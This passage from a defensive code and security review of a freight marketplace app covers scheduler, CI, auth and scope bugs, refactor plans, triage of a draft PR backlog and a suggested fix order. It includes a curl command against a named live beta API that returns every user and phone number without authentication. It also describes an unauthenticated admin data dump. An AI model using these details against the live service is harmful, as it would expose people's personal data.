1. **Two instances means two payout runners** on the same ledger. Draft PR #85, unreviewed, is
   titled "Fix concurrent RazorpayX payout double-pay".
2. **Even one instance overlaps with itself.** Webhook delivery is sequential
   (`integrationWebhooks.ts:274-297`) with a 30-second timeout each. Ten dead endpoints take 300
   seconds, so the 30-second timer fires ten more times during one run, delivering duplicates.

**Fix:** an `isRunning` flag on each timer is the ten-minute version and fixes the overlap.
Multi-instance safety needs the work to move behind a lock or an external scheduler — worth
deciding before anyone raises the Render instance count.

### S5. Every domain query is a full scan, and the Prisma schema has no indexes

Lookups such as `findUserByPhone` (`auth.ts:75`) and `findActiveKey`
(`integrationAuth.ts:39-47`) iterate the entire collection on every request — the latter also
computing a SHA-256 per key. `schema.prisma` declares no `@@index` and no `@unique` beyond
primary keys.

At pilot scale this costs nothing and needs no action. It is recorded because the fix is cheap
once volume arrives, and because the missing `@unique` on `User.phone` is a correctness gap as
much as a performance one — nothing at the database level stops two users sharing a phone
number.

---

## Medium

### M1. An expired token makes a booking silently anonymous

`httpServer.ts:1460-1470`. `POST /shipments/book` wraps `verifyBearer` in a `try` and, on any
failure, proceeds with anonymous booking. Anonymous booking is a real feature, so the catch is
intentional — but it does not distinguish "no token supplied" from "token expired".

**Failure scenario:** a customer's 30-day session lapses. They book. They get a success screen.
The shipment carries no `customerOrgId` and no `bookedByUserId`, so it never appears in their
`GET /shipments` list. From their side the booking vanished, and support has no way to find it
except by phone number.

**Fix:** if an `Authorization` header is present but invalid, return 401. Fall through to
anonymous only when no header was sent.

### M2. Trip capacity uses floating-point equality to detect FULL

`services.ts:1581`: `if (trip.reservedKg === trip.capacityKg) trip.status = "FULL";`
`weightKg` is validated only as `> 0` (`:1211`), so fractional weights are accepted and
`reservedKg` accumulates floating-point error.

The release path at `:1679` correctly uses `<`. Only the FULL transition uses `===`.

**Failure scenario:** a 1,000 kg trip books ten 33.3 kg parcels and the rest in fractions.
`reservedKg` lands on 999.9999999999999. The trip never flips to `FULL` and keeps appearing in
marketplace listings with a remaining capacity of roughly zero, so every further booking attempt
fails with `insufficient_capacity` instead of the trip being hidden.

**Fix:** `>=` instead of `===`. Better, store weight in integer grams, matching the decision
already taken for money.

### M3. Webhook tracking URLs point at a hostname that is not the live portal

`integrationWebhooks.ts:70` defaults `CUSTOMER_WEB_BASE_URL` to
`https://navig8r-customer-web.onrender.com`. The marketing site links the portal at
`https://navig8r-customer.onrender.com` (`apps/www/src/main.js:1`), and PR #92 —
"Fix Explore CTA URL (drop -web)" — deliberately moved it there. `CUSTOMER_WEB_BASE_URL` is not
set in `render.yaml`, so the default is what partners receive.

There are three hostnames in the tree for two services.

**Fix:** set `CUSTOMER_WEB_BASE_URL` in `render.yaml` and confirm which host actually serves the
portal.

### M4. Nothing typechecks the codebase

`tsconfig.json` sets `strict: true` and `noEmit: true`, but no script, Dockerfile step, or CI job
ever runs `tsc`. TypeScript is not a dependency of any `package.json` in the repo, so `tsc` is not
even installed. The app runs via `--experimental-strip-types`, which **strips** types without
checking them.

Re-verified 2026-09-13 against `187fe76`: `grep -rn "tsc" .github/ package.json apps/*/package.json`
returns nothing. The new CI runs tests; it does not typecheck.

**Failure scenario:** a type error ships. The strict settings are decorative today.

**Fix:** add `typescript` as a devDependency, a `"typecheck": "tsc --noEmit"` script, and a step in
the `test` job of `release.yml`. Expect a first run to surface real errors — budget for that rather
than being surprised by it.

### M5. CI runs the tests, but only after the merge — nothing blocks a bad PR

**Fixed in part.** `.github/workflows/release.yml` now exists and runs the suite:

```yaml
jobs:
  test:
    steps:
      - uses: actions/setup-node@v4
        with: { node-version: 22 }
      - run: npm ci
      - run: npm test
  build:
    needs: test          # a red suite blocks the image build, and so the deploy
```

That is the single largest improvement to the repo since the first pass, and it closes the original
finding. Three gaps remain, in descending order of cost.

**1. The workflow does not trigger on pull requests.**

```yaml
on:
  push:
    branches:
      - main
  workflow_dispatch:
```

There is no `pull_request:` trigger, so tests never run on a PR. They run on `main` **after** the
merge. The pipeline then refuses to deploy, which is the right outcome but the wrong moment: `main`
is left red, and with 40+ open draft PRs and no required status check, the person who merged has
already moved on.

Adding four lines fixes it:

```yaml
on:
  pull_request:
  push:
    branches: [main]
  workflow_dispatch:
```

Then make `Repository Tests` a required status check in branch protection. Without the branch
protection rule the trigger alone is advisory.

**2. Nothing runs Flutter.** No workflow installs Flutter, so `flutter analyze` and `flutter test`
have never run in CI. The Dart code is roughly 7,100 lines across 13 files and is checked by nobody.
`Dockerfile.customer-web` does run `flutter build web`, so a **compile** error would fail the release
— but an analyzer warning, a failing widget test, or the `mounted` bugs in M11 would not.

**3. Nothing typechecks.** See M4.

What CI still cannot catch, by design: anything behind `PERSISTENCE=DB` (no Postgres service in the
workflow), and the marketing site (no tests exist for it).

### M6. Node 22+ is mandatory and nothing says so

`--experimental-strip-types` does not exist before Node 22.6. On Node 20 — still a widely
installed LTS — the API fails with `node: bad option: --experimental-strip-types` and no hint.
There is no `engines` field and no `.nvmrc`.

**Fix:** add `"engines": { "node": ">=22.6" }` to the root `package.json` and a `.nvmrc`
containing `22`.

### M7. No `.env.example`, for roughly 25 load-bearing variables

The only record of what must be configured is scattered across `render.yaml` comments and prose
docs. A new contributor cannot start the API without reading several files.

**Fix:** commit a `.env.example` listing every variable with a safe placeholder and a one-line
comment. The table in the README is a ready-made source.

### M8. The generated `web/index.html` is tracked and is the file the key is injected into

`scripts/inject-maps-api-key.sh` rewrites `apps/driver_pilot/web/index.html` from
`index.template.html`, substituting the real `MAPS_API_KEY`. Both files are tracked, and
`.gitignore` excludes neither. They are currently identical, so no key is committed today.

**Failure scenario:** a developer runs the script locally to test Maps, then commits. A Google
Maps API key enters git history.

**Fix:** add `apps/driver_pilot/web/index.html` to `.gitignore` and remove it from tracking.

### M9. Generated Flutter files are tracked

`.flutter-plugins`, `.flutter-plugins-dependencies`, `driver_pilot.iml` and
`android/driver_pilot_android.iml` are machine-generated and regenerate differently per machine.
Flutter's own `.gitignore` template excludes them.

**Consequence:** avoidable merge conflicts on files nobody edits.

### M10. CORS omits the ERP integration's own auth headers

`httpServer.ts:106` sets `Access-Control-Allow-Headers: content-type, authorization,
x-razorpay-signature`. The integration endpoints read `x-api-key` and `x-api-secret`
(`integrationHttp.ts:76-77`), which are therefore blocked by preflight from any browser origin.

Low severity — ERP integration is server-to-server, where CORS does not apply. Worth fixing
before anyone builds a browser-based partner console.

### M11. `main.dart` calls `setState` after `await` without `mounted` guards

`main.dart` has 50 `setState` calls and 7 `mounted` checks against 16 awaits. `LoginScreen`
alone does it at lines 482, 491, 493, 517, 522 and 527. `driver_flow.dart` (54 guards) and
`customer_flow.dart` (47 guards) are much better disciplined.

**Failure scenario:** a user taps back while an OTP request is in flight; `setState` fires on a
disposed widget and throws.

**Fix:** this code is the legacy pilot-lab surface — see R3. Deleting it resolves this finding
entirely.

---

### M12. `webhooks:manage` is a scope that can be granted but is never checked

`types.ts:267` declares three scopes: `loads:read`, `loads:write`, `webhooks:manage`. Grepping
every call site of `assertIntegrationScope` shows only the first two are ever enforced
(`integrationHttp.ts:81, 107, 124, 132, 145`). **`webhooks:manage` is checked nowhere.**

Separately, `POST .../keys` passes `body?.scopes` straight into `createIntegrationApiKey`
(`integrationHttp.ts:201` → `integrationServices.ts:111`) with no runtime membership check. The
TypeScript union is not a guard here, because `--experimental-strip-types` never typechecks
anything (see M4).

**To be clear about severity: this is not a privilege escalation.** Enforcement is
`ctx.scopes.includes(scope)`, so a junk scope produces a *less* capable key, not a more capable
one. The real cost is that the partner-facing contract advertises least-privilege it does not
implement: a key issued with only `webhooks:manage` can still call every `loads:*` route it was
never granted, because those routes check for scopes the key does not have and therefore reject —
while a key issued `loads:read` alone can do anything webhook-related that the M2M surface ever
gains, since nothing will check.

**Fix:** either enforce `webhooks:manage` on the webhook routes or delete it from the union, and
validate `body.scopes` against the allowed set at the edge, rejecting unknown values instead of
storing them.

### M13. Four helpers are defined fifteen times across eight files

Verified by grepping for the definitions, not the call sites:

| Helper | Definitions | Where |
|---|---|---|
| `nowUtcMs` | 6 | `auth.ts:5`, `integrationAuth.ts:5`, `integrationServices.ts:34`, `integrationWebhooks.ts:15`, `razorpayWebhook.ts:4`, `services.ts:45` |
| `id(prefix)` | 4 | `auth.ts:9`, `integrationWebhooks.ts:19`, `integrationServices.ts:38`, `services.ts:134` |
| `membershipKey` | 3 | `persistence.ts:108`, `persistenceDb.ts:23`, `services.ts:143` |
| `normalizeInPhone` | 2 | `auth.ts:65`, `services.ts:147` |

`nowUtcMs` and `id` are trivial and duplicating them costs little — three similar lines beat a
premature abstraction, and these barely qualify as abstractions. **The other two are different,
because they encode rules that must agree:**

- **`membershipKey`** is the key format for the `memberships` map. If the copy in `persistence.ts`
  ever drifts from the one in `services.ts`, memberships silently stop resolving after a reload —
  users appear to lose their org, with no error.
- **`normalizeInPhone`** is an identity rule. `auth.ts` uses it to decide *who you are* at OTP
  time; `services.ts` uses it to decide *which shipments you can see* (H7's phone linkage). If
  those two ever disagree about, say, a `+91` prefix or a leading zero, a user authenticates as one
  identity and is matched as another.

**Fix:** move `membershipKey` and `normalizeInPhone` into a single shared module and import them.
Leave `nowUtcMs` and `id` alone unless they are already being touched — consolidating them buys
nothing and costs an import hop.

---

## Structural refactors

These are the largest files. Each proposal names the new files, what moves, and **what gets
harder** — a split with no stated cost has not been thought through. None of these should be
done while other work is in flight; they conflict with everything.

### R1. Split `services.ts` (2,277 lines, 67 exports) along its real seams

One file currently holds onboarding, ops administration, geofencing, pricing, booking, capacity,
delivery, refunds, tracking and payouts. It fails the one-sentence test badly.

Rather than a mechanical split, take the seams where coupling is genuinely low:

| New file | What moves | Lines |
|---|---|---|
| `domain/pricing.ts` | `computeFreightGrossPaise`, `quoteShipmentMarketplace`, `pilotRatesEstimate`, `FreightBreakdown` | ~1005-1188 |
| `domain/payouts.ts` | `runPayoutBatch`, ledger helpers, `pilotListCarrierLedger`, payout-batch listing | ~2150-2277, ~1110-1130 |
| `domain/identity.ts` | org/user/membership creation, ops-admin grant and revoke, visibility predicates | ~190-612 |
| `domain/delivery.ts` | `submitDriverPod`, `markPodDelivered`, `releasePaymentAndDeliver`, `failCarrierAndRefund` | ~1345-1410, 1600-1818 |
| `services.ts` (remainder) | trips, booking, capacity, tracking | the rest |

`domain/pricing.ts` is the cleanest and safest first move: it is pure, takes no `Store`, and is
already covered by `freight.test.ts`. **Do that one alone first** and see whether the rest earns
its disruption.

**What gets harder:** shared helpers (`nowUtcMs`, `id`, `moneySplit`, `haversineKm`) need a
`domain/shared.ts`, adding an import hop. And because every function takes `Store`, the files
stay coupled through the store type — the split improves navigation, not decoupling. Do not
expect it to reduce complexity, only to make it findable.

### R2. Extract the portal HTML out of `httpServer.ts` (1,695 lines)

Roughly 590 lines of the file are template-literal HTML and browser JavaScript for `/admin` and
`/ops`. They are not server logic and they defeat editor tooling — the XSS in H2 survived
partly because it is JavaScript inside a string inside a route handler.

**Step one, low risk and high payoff:** move the two documents into `apps/api/src/portals/
adminHtml.ts` and `opsPortalHtml.ts`. This alone drops `httpServer.ts` by a quarter and puts the
XSS fix somewhere a reviewer will look.

**Step two, only if step one proves out:** group routes into `routes/auth.ts`, `routes/pilot.ts`,
`routes/marketplace.ts`, `routes/ops.ts` and `routes/legacy.ts`.

**What gets harder, and it is significant:** the router is a linear if-chain where **order is
load-bearing**. Splitting the chain across files makes that ordering invisible and easy to break
silently. If step two happens, replace the chain with an explicit ordered route table in the same
commit. Do not split the chain and keep the if-chain semantics.

### R3. Delete the legacy "pilot lab" surface from `main.dart`

`main.dart` (1,151 lines) contains `PilotScaffold`, `HomeScreen`, `RegisterScreen`,
`LoginScreen`, `MyTripsScreen`, `TripDetailScreen` and `PublishTripScreen` — a complete second
generation of the driver experience, routed at `/pilot-lab`, `/register`, `/trips` and
`/publish`, and reachable from neither the driver nor the customer shell (the app starts at
`/driver` or `/customer`).

They duplicate `DriverRegisterScreen`, `DriverPhoneScreen`, `DriverOtpScreen`,
`DriverShipmentsScreen`, `DriverShipmentDetailScreen` and `DriverPublishTripScreen`.

**This is the highest-value refactor in the document** — it is a deletion, not a restructure. It
removes roughly 900 lines, eliminates the risk of fixing a bug in the wrong copy, and resolves
M11 outright. `main.dart` becomes about 150 lines of bootstrap and router.

**Check first:** confirm nobody is using `/pilot-lab` for demos, and keep `/login`, which the
customer flow redirects through.

**What gets harder:** nothing, if the routes are genuinely unused. Verify before deleting.

### R4. Split the two 2,000-line Flutter screen files by journey

`driver_flow.dart` (2,305 lines, 18 screens) and `customer_flow.dart` (2,149 lines, 11 screens plus two private tab widgets).

Both are cohesive in the sense that everything in them belongs to one persona — but neither can
be described without listing six journeys, and the practical cost is real: in
`customer_flow.dart`, `CustomerRegisterScreen` is declared at line 472 while its state class
`_CustomerRegisterScreenState` sits at line 1083, with the 378-line integrations screen wedged
between them.

| From | New files |
|---|---|
| `driver_flow.dart` | `driver/shell.dart`, `driver/onboarding.dart`, `driver/shipments.dart`, `driver/trip.dart`, `driver/earnings.dart`, `driver/publish.dart`, `driver/vehicle.dart` (the new profile editor) |
| `customer_flow.dart` | `customer/shell.dart`, `customer/auth.dart`, `customer/team.dart`, `customer/integrations.dart` (704-1082), `customer/browse.dart`, `customer/booking.dart`, `customer/shipments.dart` |

**What gets harder:** the route lists (`driverFlowRoutes()`, `customerFlowRoutes()`) must import
from every new file, and private widgets currently shared within the file (`_LoadCard`,
`_StatTile`, `_ShipmentTimeline`) have to become public or move to a shared widgets file. Expect
the total line count to go up slightly.

**Do R3 before R4.** Deleting the legacy screens may reveal that some driver screens are shared,
which changes the boundaries.

---

## Quick wins

Each of these is under an hour and has real payoff.

| Fix | Why it earns the hour |
|---|---|
| Reject non-finite `weightKg` at the edge (C0b) | One `Number.isFinite` check; closes an unauthenticated, unrecoverable trip-destroying bug |
| Drop `/pod` and `/fail-refund` from the marketplace allowlist (C0d) | Two deleted lines; restores the ops release gate. The app uses `driver-pod`, so nothing breaks |
| Add `publicTripView()` for the two public trip routes (C0) | One projection function; stops serving driver GPS to the world |
| Add `pull_request:` to `release.yml` and require the check (M5) | Four lines; tests currently run only after the merge |
| Set `ENABLE_LEGACY_DEMO_SURFACE` as the sole demo-surface switch (C5) | One line; closes an unauthenticated user dump on alpha and beta |
| Filter tombstoned trips from the two marketplace reads (C6) | Two conditions; stops customers booking a deactivated carrier |
| Pass `MAPS_API_KEY` in `Dockerfile.customer-web` (C7) | Three lines; prevents address entry breaking at cutover |
| `>=` instead of `===` in the FULL check (M2) | One character; prevents stuck trips |
| Guard `payment.captured` on `REFUNDED` (C3) | One line; prevents money-state corruption |
| Gate `ALLOW_X_USER_ID` on `NODE_ENV` (H1) | One condition; closes a total-impersonation switch |
| Stop storing empty payout batches (S2) | Two lines; stops 526k rows a year |
| Add `engines` and `.nvmrc` (M6) | Two lines; saves the next contributor an hour |
| `.gitignore` the generated `web/index.html` (M8) | One line; prevents an API key reaching git |
| Set `CUSTOMER_WEB_BASE_URL` in `render.yaml` (M3) | Three lines; partner tracking links resolve |
| Add `.env.example` (M7) | Copy the README table |

---

## What is already good

A review that only lists problems misleads. These are decisions worth keeping, and worth not
"fixing":

- **`packages/core/src/payoutSchedule.ts`** is the best code in the repository. The fixed
  `+05:30` offset is correct rather than lazy — India has never observed DST, the file says so,
  and the tests cover month overflow and cutoff rollover. Do not replace this with a timezone
  library.
- **The Razorpay inbound webhook is handled correctly.** The raw body is verified before
  `JSON.parse`, the comparison is timing-safe, and a missing secret fails closed with a 503.
- **Money is integer paise throughout**, and `moneySplit` floors the commission so rounding
  always favours the carrier. That is a deliberate, defensible default.
- **Integration API secrets are never stored in plaintext** — only as a salted SHA-256.
- **The webhook outbox pattern is the right architecture**, with sensible backoff and a
  `DEAD` terminal state rather than infinite retries.
- **The JSON store's write is atomic** (temp file then rename) and the format is versioned V1
  through V4 with real migrations.
- **Authorize-at-booking, capture-at-POD** is the correct ordering for freight, and the state
  machines encode it properly.
- **Flutter platform differences use conditional imports** rather than runtime branching, which
  is the idiomatic Dart mechanism.

---

## The open draft PR backlog

Forty-plus draft PRs are open, the oldest from 10 July, none reviewed. Most of the volume is
noise, and it is hiding a handful of real fixes. As of 2026-09-13 the newest are #104 and #106.

**PRs #65 through #80 are sixteen near-duplicate PRs**, titled "Fix critical ERP integration
state regressions" or a close variant, opened roughly daily. That is an automated agent
re-running the same analysis and opening a fresh PR each time rather than updating one. Whatever
it found, it found once.

**Suggested triage, oldest first:**

| PRs | Action |
|---|---|
| #65–#80 | Read the newest one (#80) only. If its fix is sound, take it and close #65–#79 as superseded. Then stop or rate-limit whatever opens these. |
| #81–#85, #87, #98 | Distinct findings, several confirmed independently below. Review individually. |
| #86, #89 | Documentation PRs (a PRD, an AGENTS.md). #86 overlaps the rewritten README in this PR — worth reconciling rather than merging both. |
| #93, #95, #96, #97 | Marketing site and build notes, small and self-contained. Quick to clear. |
| #101, #102 | #101 carries real production measurements; #102 is about production data durability and outranks everything else here. Read these two first. |
| #104, #106 | Opened since the first pass. Both verified correct against the source — see below. |

**#104 is correct but fixes one third of the problem.** It reports that beta ignores
`ENABLE_LEGACY_DEMO_SURFACE=0` because `NODE_ENV=beta` is not `production`. Verified at
`httpServer.ts:321`. What it does not say is that the same `NODE_ENV !== "production"` test also
disables the CORS origin allowlist (`:92`) and the HTTPS requirement on partner webhook URLs
(`integrationServices.ts:98`). Fixing only the demo surface leaves two holes open on beta. See C5.

**#106 is correct.** It reports that ops-tombstoned trips are still listed and bookable. Verified
in both paths: `httpServer.ts:1396` applies no filter at all, and `services.ts:1319` filters only
on `status !== "OPEN"` — and `markInactive` does not change `status`. See C6.

**#102 is correct, and it outranks everything else in this document.** It argues the production
store lives on the ephemeral Docker container layer rather than the mounted Render disk, so the
JSON store is discarded on every deploy.

I initially could not reproduce this because I checked `render.yaml`, which *is* correct — it
pairs `disk: { mountPath: /data }` with `DATA_FILE=/data/store.json`. That was the wrong file to
look at. The failure is in the code's fallback:

```ts
// httpServer.ts:347
const dataFilePath = process.env.PERSISTENCE === "DB"
  ? null
  : (process.env.DATA_FILE ?? "./data/store.json");
```

The Dockerfile's final `WORKDIR` is `/app/apps/api` (`Dockerfile:22`). So whenever `DATA_FILE` is
*not actually set in the running process*, the store is written to
`/app/apps/api/data/store.json` — inside the container's writable layer, which is destroyed on
every deploy. The blueprint being right does not help if the dashboard never applied it.

**Re-checked 2026-09-13 against `187fe76`.** The code default at `httpServer.ts:347` is unchanged,
and the Dockerfile still ends at `WORKDIR /app/apps/api`. The rewritten `render.yaml` now sets
`DATA_FILE=/data/store.json` and mounts a 1 GB disk at `/data` on **all three** environments, so
if the blueprint is applied the symptom goes away. Two things keep this open:

- The blueprint was already correct before, and the store was still wiped. The gap between
  `render.yaml` and the dashboard is the actual failure, and nothing in this change closes it.
- The unsafe default survives. A relative `./data/store.json` inside a container is never the
  right answer. It should fail loudly instead: `DATA_FILE` required whenever `PERSISTENCE !== "DB"`.

Settle it with `curl -s <api>/health` — it reports `persistence` and, now, the `release` SHA.

**The empty payout batches from S2 independently corroborate this**, which is worth spelling out
because it turns a config suspicion into measured evidence. Those rows accrue at exactly one per
minute and are never pruned, so the count is a monotonic clock of time-since-last-wipe:

| Report | Rows | Implied uptime |
|---|---|---|
| #101 | 21,832 | 15 days 3 hours |
| #102 (2026-09-03) | 808 | 13 hours |

A monotonically increasing counter cannot fall from 21,832 to 808. The store was reset between
the two observations. S2's bug is, accidentally, this system's only deploy-wipe detector.

**A second consequence #102 does not draw out.** It reports that `GET /admin` rendered live. In
production `/admin` is supposed to return 403 unless `ENABLE_LEGACY_DEMO_SURFACE=1`
(`httpServer.ts:317`). If it rendered, then either that flag is set or `NODE_ENV` is not
`production` in the running process — and `/admin` dumps the **entire** store as HTML: every
user, phone number, membership, shipment, payment and ledger line, with no authentication. That
is a live PII exposure, and it is the same dashboard-drift root cause. Confirm it with a status
code before assuming either way.

**Where those PRs meet the findings in this document** — four were confirmed here by reading
the source independently, so they are real and worth taking seriously:

| PR | Finding here | Confirmed |
|---|---|---|
| #101 empty payout batches | S2 | Yes — and it supplies live figures I could not get: 21,832 rows, ~7MB `/admin` |
| #87 stored XSS in ops portal | H2 | Yes — `httpServer.ts:233`, `:247`, `:1231` |
| #98 carrier payout history leak | H8 | Yes — `services.ts:1120` returns the whole batch |
| #85 concurrent RazorpayX payout double-pay | S4 | Yes — two unguarded timers, no re-entrancy flag |
| #84 OTP lockout, capacity NaN, phone squat | H3, M2, H7 | Related; not verified line-by-line against the PR |
| #83 checkout capacity leaks | C4 | Related; not verified line-by-line against the PR |
| #82 payout hijack, POD-before-start | H1, C1 | Related; not verified line-by-line against the PR |

The last three rows are title-level matches only. Read the PRs before assuming they fix what is
described here.

## Suggested order

0. **C5 first, today.** `curl https://navig8r-api-beta.onrender.com/v1/users` returns every user
   and phone number, unauthenticated, and the blueprint reads as though that were switched off.
   It is one line to fix and it is live now. Then **C0, C0b and C0d** — all reachable in
   production, none needing an account. C0b is the most urgent of those three: one malformed
   request permanently destroys a trip with no recovery path.
1. **Unblock the pilot:** H3 (SMS and OTP rate limiting) **together with C0c** (the OTP
   challenge mismatch). Doing H3 alone will not produce a working login — customer sign-in will
   still fail and driver sign-in will send two messages per attempt.
2. **The quick wins table.** An afternoon, and it removes two money-correctness bugs and an
   impersonation switch.
3. **Triage the draft PR backlog** using the table above. Sixteen are duplicates; five contain
   fixes for findings confirmed here (#87, #98, #101, #102, #104, #106).
4. **H7**, the organization-name IDOR. It is a data-exposure bug between customers, and the fix
   is small.
5. **C1 and C4** before `PAYOUTS_MODE=RAZORPAYX` or any real capacity pressure.
6. **C2 and S1** before `PERSISTENCE=DB`. Postgres is not currently a safe switch.
7. **R3**, the deletion. Cheap, and it makes the Flutter code honest.
8. **R1 step one and R2 step one** — `domain/pricing.ts` and the portal HTML extraction — then
   reassess whether the rest is worth it.

**Before the customer-web cutover, whenever that happens:** C7. It is not broken today and it will
be broken the moment the image-backed service replaces the static one.
